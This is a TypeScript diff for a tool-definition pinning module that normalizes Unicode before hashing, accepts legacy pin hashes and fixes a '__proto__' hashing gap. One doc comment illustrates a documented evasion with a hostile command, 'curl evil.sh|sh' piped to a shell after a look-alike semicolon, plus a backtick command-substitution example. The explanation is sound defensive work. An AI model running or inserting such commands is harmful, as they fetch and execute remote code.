@@ -183,20 +183,125 @@ const PinsFileSchema = z.object({
  * Stable hash of a tool definition. Stringifies in canonical (sorted-key)
  * form so equivalent JSON with different key order produces the same hash.
  */
-export function hashToolDefinition(input: {
+const sortedReplacer = replacerFor("NFC");
+/** #26: candidate spellings a pre-NFC pin could have been taken over. */
+const legacyReplacers = [replacerFor("NFD"), replacerFor(null)];
+
+export function hashToolDefinition(input: ToolDefinitionFields): string {
+  return hashLeaf(definitionLeaves(input), sortedReplacer);
+}
+
+/** The three leaves the pin hash covers. */
+export interface ToolDefinitionFields {
   description?: string | null;
   schema?: unknown;
   annotations?: unknown;
-}): string {
-  const canonical = JSON.stringify(
-    {
-      description: input.description ?? "",
-      schema: input.schema ?? null,
-      annotations: input.annotations ?? null,
-    },
-    sortedReplacer,
+}
+
+/** The canonical leaves the whole-definition hash covers. */
+function definitionLeaves(input: ToolDefinitionFields) {
+  return {
+    description: input.description ?? "",
+    schema: input.schema ?? null,
+    annotations: input.annotations ?? null,
+  };
+}
+
+/**
+ * #26: does a stored pin hash still describe this live definition?
+ *
+ * Also accepts the hashes a PRE-#26 pin could carry, so existing pins do not read
+ * as drift on upgrade — for a schema-side hash that would be a false hard-block
+ * on `tools/list`, and it removes any need for a `PINS_FORMAT_VERSION` bump.
+ *
+ * A pin stores a hash, never the text, so the only way to ask "was this pinned
+ * over the same text?" is to re-spell the LIVE definition and hash each spelling
+ * un-normalized, the way <=v0.35.0 did: NFD (a pin taken when the server emitted
+ * decomposed text — the macOS case #26 exists for) and as-is (byte-identical).
+ * The NFC spelling is `liveHash` itself. This widens nothing beyond the fold that
+ * is already applied: every candidate is a canonically-equivalent re-spelling of
+ * the live text, so a match proves the pinned and live text are canonically
+ * equivalent — the same boundary, and the same three ASCII images, documented on
+ * {@link replacerFor}. Runs only on a mismatch, and an all-ASCII definition —
+ * almost all of them — matches on `liveHash` alone.
+ *
+ * ponytail: the pin is deliberately NOT rewritten to the NFC hash on a legacy
+ * match — the fallback is permanent and idempotent, and re-pinning would need
+ * write plumbing at both compare sites to buy only tidiness. Residual: a legacy
+ * non-NFC pin whose definition then changes for real is classified against NFC
+ * field hashes, so every field reads as changed and a description-only change
+ * tiers as `block` instead of `warn`. Rare squared, and it over-blocks a
+ * definition that genuinely changed; per-field legacy fallback if it ever bites.
+ */
+export function pinStillMatches(pinnedHash: string, liveHash: string, fields: ToolDefinitionFields): boolean {
+  if (pinnedHash === liveHash) return true;
+  const leaves = definitionLeaves(fields);
+  return legacyReplacers.some((r) => pinnedHash === hashLeaf(leaves, r));
+}
+
+/**
+ * #26: the per-field hashes a PRE-#26 pin could carry — the same candidate
+ * spellings {@link pinStillMatches} uses for the whole hash.
+ *
+ * Needed because `pinStillMatches` guards only the WHOLE hash; once it reports a
+ * real change, H4 tiers the drift by comparing FIELD hashes, and a legacy pin's
+ * fields are un-normalized. Without this, a legacy pin holding non-NFC text in
+ * its schema reported that schema as changed on a description-only edit, turning
+ * a `warn` into a hard `block` — a regression against pre-#26 behaviour, in the
+ * direction this project ranks worst (measured; adversarial review).
+ */
+export function legacyFieldHashCandidates(input: ToolDefinitionFields): readonly FieldHashes[] {
+  return legacyReplacers.map((r) => ({
+    description: hashLeaf(input.description ?? "", r),
+    schema: hashLeaf(input.schema ?? null, r),
+    annotations: hashLeaf(input.annotations ?? null, r),
+  }));
+}
+
+/**
+ * #26: does a stored HANDSHAKE hash still describe this live handshake? Same
+ * candidate-spelling argument as {@link pinStillMatches}. Handshake drift is
+ * warn-only, but a spurious warn on upgrade is still an introduced false
+ * positive, so the two paths stay symmetric.
+ */
+export function handshakeStillMatches(
+  pinnedHash: string,
+  liveHash: string,
+  result: { capabilities?: unknown; serverInfo?: { name?: unknown } },
+): boolean {
+  if (pinnedHash === liveHash) return true;
+  const name = typeof result.serverInfo?.name === "string" ? result.serverInfo.name : "";
+  return legacyReplacers.some(
+    (r) =>
+      pinnedHash ===
+      hashLeaf(
+        {
+          capabilities: hashLeaf(result.capabilities ?? null, r),
+          serverName: hashLeaf(name, r),
+        },
+        r,
+      ),
   );
-  return `sha256:${createHash("sha256").update(canonical, "utf8").digest("hex")}`;
+}
+
+/**
+ * #26: the per-dimension handshake hashes a PRE-#26 pin could carry — the
+ * handshake analogue of {@link legacyFieldHashCandidates}, and needed for the
+ * same reason: {@link handshakeStillMatches} guards only the whole hash, after
+ * which `classifyHandshakeDrift` compares the two dimensions separately. Without
+ * it, a legacy pin holding non-NFC text reported the UNTOUCHED dimension as
+ * drifted too, so a genuine capability change also claimed the server's identity
+ * had changed ("possible impersonation") — a scary, false accusation.
+ */
+export function legacyHandshakeFieldCandidates(result: {
+  capabilities?: unknown;
+  serverInfo?: { name?: unknown };
+}): readonly HandshakeFieldHashes[] {
+  const name = typeof result.serverInfo?.name === "string" ? result.serverInfo.name : "";
+  return legacyReplacers.map((r) => ({
+    capabilities: hashLeaf(result.capabilities ?? null, r),
+    serverName: hashLeaf(name, r),
+  }));
 }
 
 /**
@@ -205,11 +310,7 @@ export function hashToolDefinition(input: {
  * and these field hashes derive from identical canonical leaves, so a whole-hash
  * change implies (and is implied by) at least one field-hash change.
  */
-export function fieldHashesOf(input: {
-  description?: string | null;
-  schema?: unknown;
-  annotations?: unknown;
-}): FieldHashes {
+export function fieldHashesOf(input: ToolDefinitionFields): FieldHashes {
   return {
     description: hashLeaf(input.description ?? ""),
     schema: hashLeaf(input.schema ?? null),
@@ -217,8 +318,8 @@ export function fieldHashesOf(input: {
   };
 }
 
-function hashLeaf(value: unknown): string {
-  const canonical = JSON.stringify(value, sortedReplacer);
+function hashLeaf(value: unknown, replacer = sortedReplacer): string {
+  const canonical = JSON.stringify(value, replacer);
   return `sha256:${createHash("sha256").update(canonical, "utf8").digest("hex")}`;
 }
 
@@ -254,14 +355,85 @@ export function hashHandshake(f: HandshakeFieldHashes): string {
   return hashLeaf({ capabilities: f.capabilities, serverName: f.serverName });
 }
 
-function sortedReplacer(_key: string, value: unknown): unknown {
-  if (value !== null && typeof value === "object" && !Array.isArray(value)) {
+/**
+ * #26: builds a canonical JSON.stringify replacer — sorts object keys, and folds
+ * every string to Unicode normal form `form` (`null` = leave text as-is, which
+ * reproduces the pre-#26 canonicalization byte-for-byte).
+ *
+ * {@link sortedReplacer}, the form everything is hashed and stored under, is
+ * "NFC" — so a definition that flips NFD→NFC without changing what it says keeps
+ * one hash instead of reading as drift (H4 tiers a schema-side change as `block`,
+ * i.e. a false hard-block on `tools/list`). An all-ASCII definition is unaffected:
+ * NFC is the identity on ASCII and folded keys sort identically, so pins written
+ * by earlier versions keep matching without a `PINS_FORMAT_VERSION` bump.
+ *
+ * NFC and deliberately NOT NFKC. NFC is canonical equivalence only, so folded
+ * strings RENDER identically. NFKC also folds compatibility characters (ﬁ→fi,
+ * ①→1, full-width→half-width), which render differently — collapsing those would
+ * let a server swap one visible definition for another under an unchanged hash.
+ *
+ * KNOWN BOUNDARY (security review, deliberately accepted): "renders identically"
+ * is NOT "means identically to a byte-level consumer". Exactly three code points
+ * have a printable-ASCII NFC image — U+037E→";", U+1FEF→"`", U+212A→"K" (verified
+ * exhaustively over all of Unicode; the set is complete and contains no digit,
+ * quote, bracket, slash or space). Both shell metacharacters matter, not just the
+ * first: a schema default pinned as `ls /tmp\u037E curl evil.sh|sh` and later
+ * flipped to a literal ";" keeps ONE hash, and so does `echo \u1FEFid\u1FEF`
+ * flipped to backticks — command substitution, not merely a separator. The same
+ * holds for a regex or an exact-match allowlist, none of which normalize. And
+ * because KEYS fold too (when injective), this covers a schema property RENAME:
+ * a property named U+212A renamed to "K" is a real wire-level change that
+ * produces no drift.
+ *
+ * Kept folded anyway. All three have ordinary uses — the Kelvin sign in a unit
+ * description, the Greek question mark and varia in Greek prose — so excluding
+ * them buys a narrow evasion class at the price of false-BLOCKING those servers,
+ * and this project ranks a wrong block worse than a miss. The evasion also
+ * requires the attacker to have pinned a definition that ALREADY renders as the
+ * malicious form. Recorded as a residual rather than silently absorbed.
+ *
+ * The non-NFC forms exist only to recognise a pre-#26 pin — see
+ * {@link pinStillMatches}. They are never written.
+ *
+ * They do NOT reproduce <=v0.35.0 byte-for-byte, deliberately: they carry the
+ * `Object.create(null)` fix below, so they emit a `__proto__` member that
+ * v0.35.0 dropped. Consequence, accepted: a pin written before v0.36.0 over a
+ * definition that has a `__proto__` schema property reads as drift once on
+ * upgrade, even unchanged. **Making them drop it instead was tried and reverted**
+ * — a `__proto__`-free candidate spelling is offered for EVERY pin, not just a
+ * legacy one, so adding a `__proto__` property became invisible again and the fix
+ * below disarmed itself (caught by its own regression test). The two cases are
+ * indistinguishable from a hash alone, because a v0.35.0 hash carries no
+ * information about that member at all. A near-empty population taking a
+ * one-time, `accept-drift`-able block beats re-opening the hole for everyone.
+ */
+function replacerFor(form: "NFC" | "NFD" | null) {
+  const fold = form === null ? (s: string) => s : (s: string) => s.normalize(form);
+  return function canonicalReplacer(_key: string, value: unknown): unknown {
+    if (typeof value === "string") return fold(value);
+    if (value === null || typeof value !== "object" || Array.isArray(value)) return value;
+
     const obj = value as Record<string, unknown>;
-    const sorted: Record<string, unknown> = {};
-    for (const k of Object.keys(obj).sort()) sorted[k] = obj[k];
+    // Fold keys too, but ONLY while that stays injective for this object. Two
+    // keys differing solely by normalization are distinct JSON members; if
+    // folding collided them, one member would vanish from the hash and hide a
+    // real difference. Non-injective => keep raw keys and let it read as drift.
+    const keys = Object.keys(obj);
+    const injective = new Set(keys.map(fold)).size === keys.length;
+    const emit = injective ? fold : (k: string) => k;
+
+    // Null prototype, NOT an object literal: assigning the key "__proto__" on a
+    // literal hits the inherited setter, so the member never becomes an own
+    // property and JSON.stringify omits it — a schema property named __proto__
+    // was invisible to the pin hash, and could be added or altered with no drift
+    // finding. Pre-existing (origin/main had the same `sorted[k] = obj[k]`),
+    // fixed here because it is one word in the function being rewritten.
+    const sorted: Record<string, unknown> = Object.create(null) as Record<string, unknown>;
+    for (const [key, raw] of keys.map((k) => [emit(k), k] as const).sort((a, b) => (a[0] < b[0] ? -1 : a[0] > b[0] ? 1 : 0))) {
+      sorted[key] = obj[raw];
+    }
     return sorted;
-  }
-  return value;
+  };
 }
 
 export function emptyPinsFile(): PinsFile {
